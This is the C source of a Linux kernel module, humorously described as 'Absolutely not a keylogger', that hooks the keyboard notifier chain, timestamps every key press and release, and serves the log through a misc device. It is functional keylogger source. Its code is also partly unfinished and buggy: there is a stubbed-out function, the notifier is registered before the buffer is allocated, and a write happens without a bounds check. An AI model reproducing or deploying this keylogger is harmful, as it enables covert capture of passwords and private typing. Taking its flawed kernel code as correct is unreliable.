#include <linux/module.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/mutex.h>
#include <linux/interrupt.h>
#include <linux/keyboard.h>
//#include "keymap.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Romain Kowalski");
MODULE_DESCRIPTION("Absolutely not a keylogger.");

#define MODULE_NAME "not_a_keylogger"
#define DEVICE_NAME "definitely_not_key_logs"
#define PRESSED 1
#define RELEASED 0

static struct	key_stroke {
	unsigned int		keycode;
	char			value; // a virer ?
	char			full_name[15];
	bool			pressed; // 1 = pressed, 0 = released
	ktime_t			time;
};

static size_t			captured_size = 0;
static size_t			captured_max_size = 0;
static struct key_stroke	*captured_keys = NULL;
static char			*log_file = NULL;
static struct mutex		log_mutex; // for log_file
static struct mutex		keys_mutex; // for captured_keys

static void	print_notifier_data(struct keyboard_notifier_param *param,
					unsigned long action)
{
	char c;

	c = param->value;
	pr_info("stage: %ld\n", action);
	pr_info("pressed: %d\n", param->down);
	pr_info("shift: %d\n", param->shift);
	pr_info("value(dec): %d", param->value	);
	pr_info("key pressed (dec): %d", c);
	pr_info("key pressed (hex): %#x", c);
	pr_info("key pressed (ascii): %c", c);
}

static int	ktime_to_hours(ktime_t time)
{
	int	hours;
	hours = time / 1000000000; // seconds
	hours /= 60; // minutes
	hours /= 60; // hours
	hours = hours % 24;
	return (hours);
}

static int	ktime_to_minutes(ktime_t time)
{
	int	minutes;
	minutes = time / 1000000000; // seconds
	minutes /= 60; // minutes
	minutes = minutes % 60;
	return (minutes);
}

static int	ktime_to_seconds(ktime_t time)
{
	int	seconds;
	seconds = time / 1000000000; // seconds
	seconds = seconds % 60; // minutes
	return (seconds);
}

static void	key_stroke_to_buffer(struct key_stroke entry, char *buffer,
								size_t len)
{
	int	hours;
	int	minutes;
	int	seconds;
	char	format[] = "[%2d:%02d:%02d] (%d) %s\n";
	hours = ktime_to_hours(entry.time);
	minutes = ktime_to_minutes(entry.time);
	seconds = ktime_to_seconds(entry.time);
	snprintf(buffer, len, format, hours, minutes, seconds, entry.keycode,
				(entry.pressed ? "Pressed": "Released"));
}
// received first, it's where we create the key record
static int	handle_keycode(struct keyboard_notifier_param *param)
{
	mutex_lock(&keys_mutex);
	if (captured_size == captured_max_size) {
		captured_keys = krealloc_array(captured_keys,
		captured_max_size * 2, sizeof(struct key_stroke), GFP_KERNEL);
		if (!captured_keys) {
			mutex_unlock(&keys_mutex);
			return (NOTIFY_BAD);
		}
		captured_max_size *= 2;
	}
	captured_keys[captured_size].keycode = param->value;
	captured_keys[captured_size].pressed = param->down;
	captured_keys[captured_size].time = ktime_get_real();
	mutex_unlock(&keys_mutex);
	return (NOTIFY_OK);
}

/*static void	param_to_full_name(struct keyboard_notifier_param *param)
{
	if (is ascii)

	else if (is 
*/

static int	handle_keysym(struct keyboard_notifier_param *param)
{
	mutex_lock(&keys_mutex);
	captured_keys[captured_size].value = param->value;
	captured_size++;
	mutex_unlock(&keys_mutex);
	return (NOTIFY_OK);
}

static int	key_pressed(struct notifier_block *self, unsigned long action,
								void *data)
{
	if (action == KBD_KEYCODE)
		return (handle_keycode(data));
	else if (action == KBD_KEYSYM) {
		return (handle_keysym(data));
	}
	return (NOTIFY_DONE);
}

static struct notifier_block	nb = {
	.notifier_call = &key_pressed,
	.priority = 0,
	.next = NULL,
};

static ssize_t 	logs_read(struct file *filp, char __user *buffer, size_t len,
							loff_t *offset)
{
	int	ret = 0;
	mutex_lock(&log_mutex);
	if (log_file)
		ret = simple_read_from_buffer(buffer, len, offset, log_file,
							strlen(log_file));
	mutex_unlock(&log_mutex);	
	return (ret);
}

static int	logs_open(struct inode *inode, struct file *file)
{
	int	log_len;
	char	line[30];
	int	i;
	try_module_get(THIS_MODULE);
	mutex_lock(&log_mutex);
	kfree(log_file);
	log_len = 0;
	i = 0;
	while (i < captured_size) {
		key_stroke_to_buffer(captured_keys[i], line, 30);
		if (log_file)
			log_len = strlen(log_file);
		log_file = krealloc_array(log_file, log_len + strlen(line) + 1,
						sizeof(char), GFP_KERNEL);
		if (!log_file) {
			mutex_unlock(&log_mutex);
			pr_err("%s: krealloc_array error\n", MODULE_NAME);
			return (1);
		}
		if (log_len == 0)
			log_len = strscpy(log_file, line, strlen(line) + 1);
		else
			strncat(log_file, line, strlen(line));
		i++;
	}
	pr_info("Log file opened\n");
	mutex_unlock(&log_mutex);
	return (0);
}

static int	logs_close(struct inode *inode, struct file *file)
{
	if (module_refcount(THIS_MODULE) == 1) {
		mutex_lock(&log_mutex);
		kfree(log_file);
		log_file = NULL;
		mutex_unlock(&log_mutex);
	}
	module_put(THIS_MODULE);
	pr_info("Log file closed");
	return (0);
}

static struct file_operations	logs_fops = {
	.open = &logs_open,
	.release = &logs_close,
	.read = &logs_read,
};

static struct miscdevice	logs_device = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = DEVICE_NAME,
	.fops = &logs_fops
};

static int	__init kl_init(void)
{
	int	ret;

	ret = misc_register(&logs_device);
	if (ret) {
		pr_err("%s: Loading module failed\n", MODULE_NAME);
		return (-ret);
	}
	pr_info("%s: Module loaded\n", MODULE_NAME);
	ret = register_keyboard_notifier(&nb);
	if (ret) {
		misc_deregister(&logs_device);
		pr_err("%s: Registering keyboard notifier failed\n", MODULE_NAME);
		return (-ret);
	}
	captured_max_size = 10;
	captured_keys = kmalloc_array(captured_max_size,
					sizeof(struct key_stroke), GFP_KERNEL);
	if (!captured_keys) {
		misc_deregister(&logs_device);
		unregister_keyboard_notifier(&nb);
		return (1);
	}
	pr_info("%s: Keyboard notifier registered\n", MODULE_NAME);
	return (0);
}

static void	__exit kl_cleanup(void)
{
	misc_deregister(&logs_device);
	kfree(log_file);
	kfree(captured_keys);
	if (unregister_keyboard_notifier(&nb))
		pr_err("%s: Error when unregistering keyboard notifier\n",
								MODULE_NAME);
	else
		pr_info("%s: Keyboard notifier unregistered\n", MODULE_NAME);
	pr_info("%s: Module unloaded\n", MODULE_NAME);
}

module_init(kl_init);
module_exit(kl_cleanup);
